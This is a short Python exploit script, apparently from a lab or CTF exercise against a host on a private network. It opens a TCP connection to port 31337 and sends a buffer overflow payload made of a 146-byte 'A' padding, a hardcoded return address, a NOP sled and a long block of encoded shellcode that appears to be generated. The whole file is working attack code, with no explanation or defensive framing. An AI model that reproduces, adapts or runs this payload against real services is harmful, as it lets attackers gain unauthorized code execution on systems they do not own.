#!/usr/bin/python3
import socket
ip = "192.168.1.83"

port = 31337
timeout = 5
prefix = b""
offset = 146
NOP = b"\x90" * 30
returnAdd = b"\xbf\x16\x04\x08"
buf =  b""
buf += b"\xd9\xca\xbe\x49\xec\xfc\xeb\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x52\x83\xeb\xfc\x31\x73\x13\x03\x3a\xff\x1e"
buf += b"\x1e\x40\x17\x5c\xe1\xb8\xe8\x01\x6b\x5d\xd9\x01\x0f"
buf += b"\x16\x4a\xb2\x5b\x7a\x67\x39\x09\x6e\xfc\x4f\x86\x81"
buf += b"\xb5\xfa\xf0\xac\x46\x56\xc0\xaf\xc4\xa5\x15\x0f\xf4"
buf += b"\x65\x68\x4e\x31\x9b\x81\x02\xea\xd7\x34\xb2\x9f\xa2"
buf += b"\x84\x39\xd3\x23\x8d\xde\xa4\x42\xbc\x71\xbe\x1c\x1e"
buf += b"\x70\x13\x15\x17\x6a\x70\x10\xe1\x01\x42\xee\xf0\xc3"
buf += b"\x9a\x0f\x5e\x2a\x13\xe2\x9e\x6b\x94\x1d\xd5\x85\xe6"
buf += b"\xa0\xee\x52\x94\x7e\x7a\x40\x3e\xf4\xdc\xac\xbe\xd9"
buf += b"\xbb\x27\xcc\x96\xc8\x6f\xd1\x29\x1c\x04\xed\xa2\xa3"
buf += b"\xca\x67\xf0\x87\xce\x2c\xa2\xa6\x57\x89\x05\xd6\x87"
buf += b"\x72\xf9\x72\xcc\x9f\xee\x0e\x8f\xf7\xc3\x22\x2f\x08"
buf += b"\x4c\x34\x5c\x3a\xd3\xee\xca\x76\x9c\x28\x0d\x78\xb7"
buf += b"\x8d\x81\x87\x38\xee\x88\x43\x6c\xbe\xa2\x62\x0d\x55"
buf += b"\x32\x8a\xd8\xfa\x62\x24\xb3\xba\xd2\x84\x63\x53\x38"
buf += b"\x0b\x5b\x43\x43\xc1\xf4\xee\xbe\x82\x3a\x46\xc1\x53"
buf += b"\xd3\x95\xc1\x42\x7f\x13\x27\x0e\x6f\x75\xf0\xa7\x16"
buf += b"\xdc\x8a\x56\xd6\xca\xf7\x59\x5c\xf9\x08\x17\x95\x74"
buf += b"\x1a\xc0\x55\xc3\x40\x47\x69\xf9\xec\x0b\xf8\x66\xec"
buf += b"\x42\xe1\x30\xbb\x03\xd7\x48\x29\xbe\x4e\xe3\x4f\x43"
buf += b"\x16\xcc\xcb\x98\xeb\xd3\xd2\x6d\x57\xf0\xc4\xab\x58"
buf += b"\xbc\xb0\x63\x0f\x6a\x6e\xc2\xf9\xdc\xd8\x9c\x56\xb7"
buf += b"\x8c\x59\x95\x08\xca\x65\xf0\xfe\x32\xd7\xad\x46\x4d"
buf += b"\xd8\x39\x4f\x36\x04\xda\xb0\xed\x8c\xfa\x52\x27\xf9"
buf += b"\x92\xca\xa2\x40\xff\xec\x19\x86\x06\x6f\xab\x77\xfd"
buf += b"\x6f\xde\x72\xb9\x37\x33\x0f\xd2\xdd\x33\xbc\xd3\xf7"



buffer = b"A" * 146 + returnAdd + NOP  + buf


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))


s.send(prefix + buffer + b"\r\n")
resp = s.recv(1024)
print(resp)

s.close()	

